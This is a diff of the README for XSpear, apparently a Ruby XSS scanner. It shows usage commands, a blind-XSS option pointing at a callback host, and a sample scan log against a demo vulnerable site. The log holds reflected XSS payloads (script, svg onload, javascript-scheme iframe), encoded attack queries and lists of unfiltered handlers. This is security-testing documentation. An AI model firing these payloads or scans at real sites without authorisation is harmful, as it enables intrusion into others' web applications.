@@ -10,9 +10,12 @@ XSpear is XSS Scanner on ruby gems
   + Reflected Params
   + Filtered test `event handler` `HTML tag` `Special Char`
 - Testing Blind XSS (with XSS Hunter , ezXSS, HBXSS, Etc all url base blind test...)
+- Dynamic/Static Analysis
+  + Find SQL Error pattern
+  + Analysis Security headers(`CSP` `HSTS` `X-frame-options`, `XSS-protection` etc.. )
+  + Analysis Other headers..(Server version, Content-Type, etc...)
 - XSpear running on ruby code(with Gem library)
-- Dynamic/Static Analysis(Find SQL Error, etc..)
-- Show table base report and testing raw query(url)
+- Show `table base cli-report` and `filtered rule`, `testing raw query`(url)
 - Testing at selected parameters
 - Support output format `cli` `json`
   + cli: summary, filtered rule(params), Raw Query
@@ -99,9 +102,19 @@ $ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -d "searchFor=yy"
 $ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -d "searchFor=yy" -v 3
 ```
 
+**set thread**
+```
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -t 30
+```
+
 **testing at selected parameters**
 ```
 $ xspear -u "http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul" -p cat,test
+```
+
+**testing blind xss**
+```
+$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -b "https://hahwul.xss.ht"
 ```
 
 etc...
@@ -109,70 +122,80 @@ etc...
 ### Sample log
 **Scanning XSS**
 ```
-$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=z"
-      )  (
-   ( /(  )\ )
-   )\())(()/(          (     )  (
-  ((_)\  /(_))`  )    ))\ ( /(  )(
-  __((_)(_))  /(/(   /((_))(_))(()\
-  \ \/ // __|((_)_\ (_)) ((_)_  ((_)
-   >  < \__ \| '_ \)/ -_)/ _` || '_|
-  /_/\_\|___/| .__/ \___|\__,_||_|    />
-             |_|                   \ /<
-  {\\\\\\\\\\\\\BYHAHWUL\\\\\\\\\\\(0):::<======================-
-                                   / \<
-                                      \>       [ v1.0.5 ]
-  [*] creating a test query.
-  [*] test query generation is complete. [138 query]
-  [*] starting test and analysis. [10 threads]
-  [I] [01:44:06] [param: cat][Found SQL Error Pattern]
-  [I] [01:44:06] reflected rEfe6[param: cat][reflected parameter]
-  [I] [01:44:08] reflected onhwul=64[param: cat][not filtered event handler on{any} pattern]
-  [-] [01:44:14] not reflected <svg/onload=alert(45)>
-  [H] [01:44:14] reflected <script>alert(45)</script>[param: cat][reflected XSS Code]
-  [H] [01:44:15] reflected "><iframe/src=JavaScriPt:alert(45)>[param: cat][reflected XSS Code]
-  [-] [01:44:15] not reflected <img/src onerror=alert(45)>
-  [-] [01:44:20] not found alert/prompt/confirm event '"><svg/onload=alert(45)>
-                 =>
-  [-] [01:44:21] not found alert/prompt/confirm event <xmp><p title="</xmp><svg/onload=alert(45)>">
-                 =>
-  [V] [01:44:21] found alert/prompt/confirm (45) in selenium!! <script>alert(45)</script>
-                 => [param: cat][triggered <script>alert(45)</script>]
-  [-] [01:44:22] not found alert/prompt/confirm event '"><svg/onload=alert(45)>
-                 =>
-  [V] [01:44:22] found alert/prompt/confirm (45) in selenium!! '"><svg/onload=alert(45)>
-                 => [param: cat][triggered <svg/onload=alert(45)>]
-  [-] [01:44:23] not found alert/prompt/confirm event '"><svg/onload=alert(45)>
-                 =>
-  [*] finish scan. the report is being generated..
-  +----+------+------------------+-------+-------------------------------------+--------------------------------------------+
-  |                                                    [ XSpear report ]                                                    |
-  |                                    http://testphp.vulnweb.com/listproducts.php?cat=z                                    |
-  |                          2019-07-23 01:44:05 +0900 ~ 2019-07-23 01:44:23 +0900 Found 7 issues.                          |
-  +----+------+------------------+-------+-------------------------------------+--------------------------------------------+
-  | NO | TYPE | ISSUE            | PARAM | PAYLOAD                             | DESCRIPTION                                |
-  +----+------+------------------+-------+-------------------------------------+--------------------------------------------+
-  | 0  | INFO | DYNAMIC ANALYSIS | cat   | XsPeaR"                             | Found SQL Error Pattern                    |
-  | 1  | INFO | REFLECTED        | cat   | rEfe6                               | reflected parameter                        |
-  | 2  | INFO | FILERD RULE      | cat   | onhwul=64                           | not filtered event handler on{any} pattern |
-  | 3  | HIGH | XSS              | cat   | <script>alert(45)</script>          | reflected XSS Code                         |
-  | 4  | HIGH | XSS              | cat   | "><iframe/src=JavaScriPt:alert(45)> | reflected XSS Code                         |
-  | 5  | VULN | XSS              | cat   | <script>alert(45)</script>          | triggered <script>alert(45)</script>       |
-  | 6  | VULN | XSS              | cat   | '"><svg/onload=alert(45)>           | triggered <svg/onload=alert(45)>           |
-  +----+------+------------------+-------+-------------------------------------+--------------------------------------------+
-  < Not Filtered >
-  [cat] param
-   + Special Char: `,\,<,|,(,;,>,',),+,-,{,.,],,,[,},:,=,$
-   + Event Handler: "onAfterUpdate","onAbort","onBeforeCut","onAfterPrint","onBeforeActivate","onActivate","onBeforeCopy","onBeforeUpdate","onBeforeEditFocus","onBeforeDeactivate","onBlur","onBounce","onCellChange","onBegin","onBeforePrint","onBeforeUnload","onBeforePaste","onCut","onContextMenu","onCopy","onDataSetComplete","onClick","onDblClick","onControlSelect","onDataSetChanged","onChange","onDataAvailable","onDragEnd","onDragOver","onDrag","onDragLeave","onDragStart","onDeactivate","onDragEnter","onDragDrop","onDrop","onEnd","onFinish","onHashChange","onFocusIn","onErrorUpdate","onHelp","onFocusOut","onInput","onFocus","onError","onFilterChange","onMouseDown","onKeyPress","onMediaComplete","onLayoutComplete","onMediaError","onKeyUp","onMessage","onKeyDown","onLoad","onLoseCapture","onMouseEnter","onMouseUp","onMouseLeave","onMove","onMoveEnd","onMoveStart","onMouseOver","onMouseMove","onMouseOut","onMouseWheel","onProgress","onOutOfSync","onPopState","onPropertyChange","onOffline","onOnline","onRedo","onPaste","onReadyStateChange","onPause","onResizeStart","onRowExit","onResume","onRowDelete","onRepeat","onReset","onResizeEnd","onReverse","onRowsEnter","onResize","onSelectionChange","onSyncRestored","onStart","onStop","onStorage","onRowInserted","onSelect","onSelectStart","onScroll","onSeek","onTrackChange","onUnload","onURLFlip","onSubmit","onTimeError","onUndo"
-   + HTML Tag: "script","iframe"
-  < Raw Query >
-  [0] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=zXsPeaR%22
-  [1] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=zrEfe6
-  [2] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%5C%22%3E%3Cxspear+onhwul%3D64%3E
-  [3] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Cscript%3Ealert%2845%29%3C%2Fscript%3E
-  [4] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Ciframe%2Fsrc%3DJavaScriPt%3Aalert%2845%29%3E
-  [5] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Cscript%3Ealert%2845%29%3C%2Fscript%3E
-  [6] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%27%22%3E%3Csvg%2Fonload%3Dalert%2845%29%3E
+xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=z"
+    )  (
+ ( /(  )\ )
+ )\())(()/(          (     )  (
+((_)\  /(_))`  )    ))\ ( /(  )(
+__((_)(_))  /(/(   /((_))(_))(()\
+\ \/ // __|((_)_\ (_)) ((_)_  ((_)
+ >  < \__ \| '_ \)/ -_)/ _` || '_|
+/_/\_\|___/| .__/ \___|\__,_||_|    />
+           |_|                   \ /<
+{\\\\\\\\\\\\\BYHAHWUL\\\\\\\\\\\(0):::<======================-
+                                 / \<
+                                    \>       [ v1.0.6 ]
+[*] creating a test query.
+[*] test query generation is complete. [149 query]
+[*] starting test and analysis. [10 threads]
+[I] [00:37:34] reflected 'XsPeaR
+[-] [00:37:34] 'cat' Not reflected |XsPeaR
+[I] [00:37:34] [param: cat][Found SQL Error Pattern]
+[-] [00:37:34] 'STATIC' not reflected
+[I] [00:37:34] reflected "XsPeaR
+[-] [00:37:34] 'cat' Not reflected ;XsPeaR
+[I] [00:37:34] reflected `XsPeaR
+...snip...
+[H] [00:37:44] reflected "><iframe/src=JavaScriPt:alert(45)>[param: cat][reflected XSS Code]
+[-] [00:37:44] 'cat' not reflected <img/src onerror=alert(45)>
+[-] [00:37:44] 'cat' not reflected <svg/onload=alert(45)>
+[-] [00:37:49] 'cat' not found alert/prompt/confirm event '"><svg/onload=alert(45)>
+[-] [00:37:49] 'cat' not found alert/prompt/confirm event '"><svg/onload=alert(45)>
+[-] [00:37:50] 'cat' not found alert/prompt/confirm event <xmp><p title="</xmp><svg/onload=alert(45)>">
+[-] [00:37:51] 'cat' not found alert/prompt/confirm event '"><svg/onload=alert(45)>
+[V] [00:37:51] found alert/prompt/confirm (45) in selenium!! <script>alert(45)</script>
+               => [param: cat][triggered <script>alert(45)</script>]
+[V] [00:37:51] found alert/prompt/confirm (45) in selenium!! '"><svg/onload=alert(45)>
+               => [param: cat][triggered <svg/onload=alert(45)>]
+[*] finish scan. the report is being generated..
++----+-------+------------------+--------+-------+-------------------------------------+--------------------------------------------+
+|                                                         [ XSpear report ]                                                         |
+|                                         http://testphp.vulnweb.com/listproducts.php?cat=z                                         |
+|                              2019-07-24 00:37:33 +0900 ~ 2019-07-24 00:37:51 +0900 Found 12 issues.                               |
++----+-------+------------------+--------+-------+-------------------------------------+--------------------------------------------+
+| NO | TYPE  | ISSUE            | METHOD | PARAM | PAYLOAD                             | DESCRIPTION                                |
++----+-------+------------------+--------+-------+-------------------------------------+--------------------------------------------+
+| 0  | INFO  | DYNAMIC ANALYSIS | GET    | cat   | XsPeaR"                             | Found SQL Error Pattern                    |
+| 1  | INFO  | STATIC ANALYSIS  | GET    | -     | original query                      | Found Server: nginx/1.4.1                  |
+| 2  | INFO  | STATIC ANALYSIS  | GET    | -     | original query                      | Not set HSTS                               |
+| 3  | INFO  | STATIC ANALYSIS  | GET    | -     | original query                      | Content-Type: text/html                    |
+| 4  | LOW   | STATIC ANALYSIS  | GET    | -     | original query                      | Not Set X-Frame-Options                    |
+| 5  | MIDUM | STATIC ANALYSIS  | GET    | -     | original query                      | Not Set CSP                                |
+| 6  | INFO  | REFLECTED        | GET    | cat   | rEfe6                               | reflected parameter                        |
+| 7  | INFO  | FILERD RULE      | GET    | cat   | onhwul=64                           | not filtered event handler on{any} pattern |
+| 8  | HIGH  | XSS              | GET    | cat   | <script>alert(45)</script>          | reflected XSS Code                         |
+| 9  | HIGH  | XSS              | GET    | cat   | "><iframe/src=JavaScriPt:alert(45)> | reflected XSS Code                         |
+| 10 | VULN  | XSS              | GET    | cat   | <script>alert(45)</script>          | triggered <script>alert(45)</script>       |
+| 11 | VULN  | XSS              | GET    | cat   | '"><svg/onload=alert(45)>           | triggered <svg/onload=alert(45)>           |
++----+-------+------------------+--------+-------+-------------------------------------+--------------------------------------------+
+< Available Objects >
+[cat] param
+ + Available Special Char: ' \ ` ] . : ) } [ { $
+ + Available Event Handler: "onActivate","onBeforeCopy","onAfterPrint","onAfterUpdate","onAbort","onBeforeActivate","onBeforeDeactivate","onBlur","onBeforeCut","onBounce","onBeforeUnload","onBeforeEditFocus","onBeforePaste","onBeforeUpdate","onBegin","onBeforePrint","onClick","onChange","onControlSelect","onDataSetChanged","onCopy","onDataSetComplete","onContextMenu","onDataAvailable","onCellChange","onCut","onDeactivate","onDblClick","onDragEnd","onDragOver","onDragDrop","onDrop","onDragStart","onDrag","onDragEnter","onDragLeave","onFilterChange","onFocusIn","onEnd","onHelp","onError","onErrorUpdate","onFocus","onFinish","onHashChange","onFocusOut","onLoad","onLoseCapture","onInput","onLayoutComplete","onKeyDown","onMessage","onKeyUp","onMediaError","onMediaComplete","onKeyPress","onMouseOver","onMove","onMouseEnter","onMouseWheel","onMouseLeave","onMoveEnd","onMouseDown","onMouseMove","onMouseUp","onMouseOut","onPropertyChange","onMoveStart","onPaste","onPopState","onOutOfSync","onProgress","onOnline","onReadyStateChange","onOffline","onPause","onResize","onReverse","onRepeat","onRedo","onResizeEnd","onRowExit","onReset","onRowsEnter","onResizeStart","onResume","onRowInserted","onScroll","onStorage","onSelectStart","onRowDelete","onSeek","onSelectionChange","onSelect","onStart","onStop","onUndo","onTrackChange","onURLFlip","onTimeError","onSyncRestored","onSubmit","onUnload"
+ + Available HTML Tag: "svg","iframe","script","audio","video","meta","frame","img","embeded","frameset","object","style"
+< Raw Query >
+[0] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=zXsPeaR%22
+[1] http://testphp.vulnweb.com/listproducts.php?cat=z?-
+[2] http://testphp.vulnweb.com/listproducts.php?cat=z?-
+[3] http://testphp.vulnweb.com/listproducts.php?cat=z?-
+[4] http://testphp.vulnweb.com/listproducts.php?cat=z?-
+[5] http://testphp.vulnweb.com/listproducts.php?cat=z?-
+[6] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=zrEfe6
+[7] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%5C%22%3E%3Cxspear+onhwul%3D64%3E
+[8] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Cscript%3Ealert%2845%29%3C%2Fscript%3E
+[9] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Ciframe%2Fsrc%3DJavaScriPt%3Aalert%2845%29%3E
+[10] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Cscript%3Ealert%2845%29%3C%2Fscript%3E
+[11] http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%27%22%3E%3Csvg%2Fonload%3Dalert%2845%29%3E
 ```            
 
 **to JSON**
@@ -231,6 +254,14 @@ class ScanCallbackFunc()
     end
 end
 ```
+
+Common Callback Class
+- CallbackXSSSelenium
+- CallbackErrorPatternMatch
+- CallbackCheckHeaders
+- CallbackStringMatch
+- CallbackNotAdded
+etc...
 
 ## Update
 if nomal user
